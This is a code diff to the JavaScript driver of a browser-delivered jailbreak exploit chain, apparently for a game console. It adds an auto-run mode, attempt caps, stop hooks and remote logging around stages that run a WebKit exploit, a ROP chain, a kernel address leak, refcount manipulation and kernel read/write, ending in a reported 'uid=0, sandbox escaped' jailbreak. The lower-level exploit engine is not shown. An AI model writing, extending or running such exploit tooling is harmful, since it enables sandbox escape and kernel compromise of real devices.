@@ -135,6 +135,43 @@ try {
     var q = (window.location.search || "").match(/[?&]log=([^&]+)/);
     __logEndpoint = (q ? decodeURIComponent(q[1]) : "") || localStorage.getItem("bgw_log_endpoint") || "";
 } catch(e) {}
+
+// --- [PSAITO e0f3857/f8554d4 port] query params ---
+// ?notify=0   disable ALL system notifications (a wrong nt offset can kill
+//             the process natively; with the flag log/panel/remote log stay alive)
+// ?auto=chain run the gated chain after init (canary -> AIO gate -> stages 0-5)
+// ?max=N      cap WebKit exploit attempts (each attempt reallocates ~100-200MB;
+//             lower the cap to avoid the "not enough free memory" dialog)
+// ?chaindelay=ms  delay between chain steps (default 1500)
+function __qp(name) {
+    var m = (window.location.search || "").match(new RegExp("[?&]" + name + "=([^&]+)"));
+    return m ? decodeURIComponent(m[1]) : "";
+}
+var __notifyDisabled = (__qp("notify") === "0");
+var __auto = (__qp("auto") || "").toLowerCase();
+var __maxAttempts = (function () {
+    var v = parseInt(__qp("max"), 10);
+    return (isNaN(v) || v < 1) ? 5 : v;
+})();
+var CHAIN_BOOT_MS = (function () {
+    var v = parseInt(__qp("chaindelay"), 10);
+    return (isNaN(v) || v < 0) ? 1500 : v;
+})();
+// [f8554d4] STOP support: call window.__bagagwaChainStop() to halt the
+// gated chain at the next step boundary (and between exploit stages).
+var __chainStop = false;
+window.__bagagwaChainStop = function () { __chainStop = true; };
+// [e0f3857] runtime redirect of the remote log endpoint. The boot-time
+// value (?log= / localStorage) is read once; payloads and code can call
+// window.setLogServer(url) at any time.
+window.setLogServer = function (u) {
+    __logEndpoint = u ? String(u) : "";
+    try { localStorage.setItem("bgw_log_endpoint", __logEndpoint); } catch (e) {}
+    var _lu = document.getElementById("logurl");
+    if (_lu) _lu.value = __logEndpoint;
+    log("setLogServer: " + (__logEndpoint || "(none)"), "info");
+    _flushRemote();
+};
 function _persist(msg) {
     try {
         var cur = localStorage.getItem("bgw_log") || "";
@@ -291,7 +328,7 @@ const ERRNO_NAMES = {
     1: "EPERM", 2: "ENOENT", 3: "ESRCH", 9: "EBADF", 12: "ENOMEM",
     13: "EACCES", 14: "EFAULT", 17: "EEXIST", 22: "EINVAL", 35: "EAGAIN",
     36: "EINPROGRESS", 38: "ENOSYS", 45: "EOPNOTSUPP", 48: "EADDRINUSE",
-    61: "ECONNREFUSED", 78: "ENOSPC",
+    61: "ECONNREFUSED", 78: "ENOSYS",
 };
 
 function errText(res) {
@@ -353,6 +390,7 @@ function note(s) {
 // Never throws: failure is logged, exploit continues.
 async function psNotify(text) {
     try {
+        if (__notifyDisabled) { log("notify skipped: notify=0", "warn"); return false; }
         if (!P || !chain) { log("notify skipped: no chain yet", "warn"); return false; }
         if (typeof OFFSET_lk_sceKernelSendNotificationRequest === "undefined") {
             log("notify skipped: no notify offset for fw " + (window.fw_str || "?"), "warn");
@@ -374,6 +412,85 @@ async function psNotify(text) {
         log("notify failed: " + (e && e.message ? e.message : e), "warn");
         return false;
     }
+}
+
+// ===== [PSAITO f8554d4 port] gated auto-chain =====
+// canary (getpid, done by init) -> AIO gate (NON-destructive ABI probe) ->
+// BAGAGWA stages 0-5 (the destructive shot). Each step only runs if the
+// previous one passed; ends with a CHAIN RESULT summary.
+async function aioGate() {
+    // PSAITO aio_reach F0 ABI check: zeros-only calls, never fires the UAF.
+    const checks = [
+        ["aio_init(0)", SYS_AIO_INIT, [0, 0, 0]],
+        ["aio_submit(0,0,0)", SYS_AIO_SUBMIT, [0, 0, 0]],
+        ["aio_multi_wait(0,0,0,mode0,0)", SYS_AIO_MULTI_WAIT, [0, 0, 0, 0, 0]],
+    ];
+    let viva = 0;
+    for (const c of checks) {
+        try {
+            const r = await sys(c[1], c[2][0], c[2][1], c[2][2], c[2][3], c[2][4]);
+            const dead = r.failed && ((-r.s32) >>> 0) === 78; // ENOSYS
+            log("[gate] " + c[0] + " -> " + (dead ? "ENOSYS (dead)" : (r.failed ? r.errText : "ok")), "info");
+            if (!dead) viva++;
+        } catch (e) {
+            log("[gate] " + c[0] + " -> THREW " + (e.message || e), "warn");
+        }
+    }
+    // 727 (0x2D7) has no libkernel C stub: needs the raw-syscall path.
+    try {
+        const r = await sys(0x2D7, 1, 0, 0);
+        log("[gate] aio_debug727(1,NULL) -> " + (r.failed ? r.errText : "ok"),
+            r.failed ? "warn" : "info");
+    } catch (e) {
+        log("[gate] aio_debug727(1,NULL) -> unavailable (" + (e.message || e)
+            + ") - 727 leak channel OFF, detection falls back to osem probe", "warn");
+    }
+    return viva > 0;
+}
+
+function chainSummary(lines) {
+    log("==========================================================", "stage-hdr");
+    log("BAGAGWA CHAIN RESULT:", "stage-hdr");
+    for (const l of lines) log("  " + l, "step");
+    log("==========================================================", "stage-hdr");
+    try { window.__bagagwaChainResult = lines.join(" | "); } catch (e) {}
+    _flushRemote();
+}
+
+async function runChainAuto() {
+    log("==========================================================", "stage-hdr");
+    log("GATED CHAIN: canary -> AIO gate -> BAGAGWA stages 0-5", "stage-hdr");
+    log("==========================================================", "stage-hdr");
+    const result = [];
+
+    // step 1: canary — init() already verified getpid; chain must be alive
+    if (chainDead || !P || !chain) {
+        log("[chain] stage 1 FAILED: ROP chain not alive (getpid never answered)", "err");
+        chainSummary(["stage 1 canary ....... FAILED"]); return;
+    }
+    log("[chain] stage 1 canary: getpid ok, chain alive", "step");
+    result.push("stage 1 canary ....... OK");
+    if (__chainStop) { chainSummary(result.concat(["chain stopped by user"])); return; }
+
+    // step 2: AIO gate (non-destructive)
+    const viva = await aioGate();
+    if (!viva) {
+        log("[chain] stage 2 sandbox AIO ... MUERTA (SAR veto) - chain closed here", "err");
+        log("[chain] the BAGAGWA chain cannot fire from this entry point:", "warn");
+        log("[chain] hardware/firmware answer, not a code error.", "warn");
+        chainSummary(result.concat(["stage 2 sandbox AIO .. MUERTA (gate closed, shot NOT fired)"]));
+        setStatus("chain closed at stage 2 (AIO dead) — shot not fired", "fail");
+        return;
+    }
+    log("[chain] stage 2 sandbox AIO ... VIVA", "step");
+    result.push("stage 2 sandbox AIO .. VIVA");
+    if (__chainStop) { chainSummary(result.concat(["chain stopped by user"])); return; }
+
+    // step 3: the shot (stages 0-5, fail-fast per stage)
+    await runExploit(true);
+    const v = (typeof window.__bagagwaStageVerdict === "string")
+        ? window.__bagagwaStageVerdict : "no verdict captured";
+    chainSummary(result.concat(["stage 3 kernel shot .. " + v]));
 }
 
 async function init() {
@@ -408,8 +525,9 @@ async function init() {
             }
             await new Promise(r => setTimeout(r, 750));
 
+            log("webkit attempt cap: " + __maxAttempts + " (?max=N — lower it to reduce memory burn per session)", "info");
             let carrier = await establishPrimitive({
-                maxAttempts: 5,
+                maxAttempts: __maxAttempts,
                 onEvent(tag, detail, attempt) {
                     if (tag === "ATTEMPT-START")
                         log("exploit attempt " + attempt, "step");
@@ -477,8 +595,9 @@ async function init() {
     }
 }
 
-async function runExploit() {
+async function runExploit(fromChain) {
     btnEl.disabled = true;
+    window.__bagagwaStageVerdict = "running...";
     try { localStorage.setItem("bgw_log", ""); } catch(e) {}
     setStatus("running Bagagwa exploit...", "run");
     log("\n=== BAGAGWA MULTI CHAIN EXPLOIT ===\n", "stage-hdr");
@@ -510,60 +629,72 @@ async function runExploit() {
         for (const s of s0.steps) log("  " + s, "step");
         if (!s0.ok) {
             log("STAGE 0 FAILED: " + s0.why, "err");
+            window.__bagagwaStageVerdict = "FAILED at stage 0: " + s0.why;
             setStatus("stage 0 failed: " + s0.why, "fail");
             return;
         }
         log("STAGE 0 OK", "step");
+        if (__chainStop) { window.__bagagwaStageVerdict = "STOPPED after stage 0"; setStatus("chain stopped by user after stage 0", "warn"); return; }
 
         log("\n--- Stage 1: osem spray ---\n", "stage-hdr");
         const s1 = await engine.stage1_spray();
         for (const s of s1.steps) log("  " + s, "step");
         if (!s1.ok) {
             log("STAGE 1 FAILED: " + s1.why, "err");
+            window.__bagagwaStageVerdict = "FAILED at stage 1: " + s1.why;
             setStatus("stage 1 failed: " + s1.why, "fail");
             return;
         }
         log("STAGE 1 OK", "step");
+        if (__chainStop) { window.__bagagwaStageVerdict = "STOPPED after stage 1"; setStatus("chain stopped by user after stage 1", "warn"); return; }
 
         log("\n--- Stage 2: kernel address leak ---\n", "stage-hdr");
         const s2 = await engine.stage2_leak();
         for (const s of s2.steps) log("  " + s, "step");
         if (!s2.ok) {
             log("STAGE 2 FAILED: " + s2.why, "err");
+            window.__bagagwaStageVerdict = "FAILED at stage 2: " + s2.why;
             setStatus("stage 2 failed: " + s2.why, "fail");
             return;
         }
         log("STAGE 2 OK", "step");
+        if (__chainStop) { window.__bagagwaStageVerdict = "STOPPED after stage 2"; setStatus("chain stopped by user after stage 2", "warn"); return; }
 
         log("\n--- Stage 3: refcount manipulation ---\n", "stage-hdr");
         const s3 = await engine.stage3_refcount();
         for (const s of s3.steps) log("  " + s, "step");
         if (!s3.ok) {
             log("STAGE 3 FAILED: " + s3.why, "err");
+            window.__bagagwaStageVerdict = "FAILED at stage 3: " + s3.why;
             setStatus("stage 3 failed: " + s3.why, "fail");
             return;
         }
         log("STAGE 3 OK", "step");
+        if (__chainStop) { window.__bagagwaStageVerdict = "STOPPED after stage 3"; setStatus("chain stopped by user after stage 3", "warn"); return; }
 
         log("\n--- Stage 4: reclaim + kernel R/W ---\n", "stage-hdr");
         const s4 = await engine.stage4_reclaim();
         for (const s of s4.steps) log("  " + s, "step");
         if (!s4.ok) {
             log("STAGE 4 FAILED: " + s4.why, "err");
+            window.__bagagwaStageVerdict = "FAILED at stage 4: " + s4.why;
             setStatus("stage 4 failed: " + s4.why, "fail");
             return;
         }
         log("STAGE 4 OK — kernel R/W established", "step");
+        if (__chainStop) { window.__bagagwaStageVerdict = "STOPPED after stage 4"; setStatus("chain stopped by user after stage 4", "warn"); return; }
 
         log("\n--- Stage 5: jailbreak ---\n", "stage-hdr");
         const s5 = await engine.stage5_jailbreak();
         for (const s of s5.steps) log("  " + s, "step");
         if (!s5.ok) {
             log("STAGE 5 FAILED: " + s5.why, "err");
+            window.__bagagwaStageVerdict = "FAILED at stage 5: " + s5.why;
             setStatus("stage 5 failed: " + s5.why, "fail");
             return;
         }
 
+        window.__bagagwaStageVerdict = "OK — JAILBROKEN (uid=0, sandbox escaped)";
         log("\n=== JAILBREAK COMPLETE ===", "stage-hdr");
         log("uid: " + s5.before.uid + " -> " + s5.after.uid, "step");
         log("getuid(): " + s5.after.getuid, "step");
@@ -571,15 +702,35 @@ async function runExploit() {
         setStatus("JAILBROKEN — uid=0, sandbox escaped", "ok");
 
     } catch (err) {
+        window.__bagagwaStageVerdict = "THREW: " + (err.message || err);
         log("exploit error: " + (err.stack || err.message || err), "err");
         setStatus("exploit failed: " + (err.message || err), "fail");
     }
 }
 
-btnEl.addEventListener("click", runExploit);
+btnEl.addEventListener("click", () => runExploit(false));
 
 if (typeof window !== "undefined" && window.location) {
     init();
+    // [f8554d4 port] ?auto=chain — gated chain starts as soon as init
+    // proves the canary (getpid), with a hard timeout so a dead boot
+    // doesn't wait forever.
+    if (__auto === "chain" || __auto === "1") {
+        log("[chain] ?auto=chain: gated chain arms after init (boot delay " + CHAIN_BOOT_MS + "ms)", "info");
+        log("[chain] STOP: call window.__bagagwaChainStop() to halt at the next boundary", "info");
+        var __chainWaited = 0;
+        var __chainTimer = setInterval(function () {
+            __chainWaited += 500;
+            if (chain && !chainDead) {
+                clearInterval(__chainTimer);
+                setTimeout(runChainAuto, CHAIN_BOOT_MS);
+            } else if (__chainWaited > 90000) {
+                clearInterval(__chainTimer);
+                log("[chain] auto-chain aborted: init never became ready in 90s", "err");
+                chainSummary(["stage 1 canary ....... FAILED (init timeout)"]);
+            }
+        }, 500);
+    }
 } else {
     setStatus("not running in a browser context", "fail");
 }
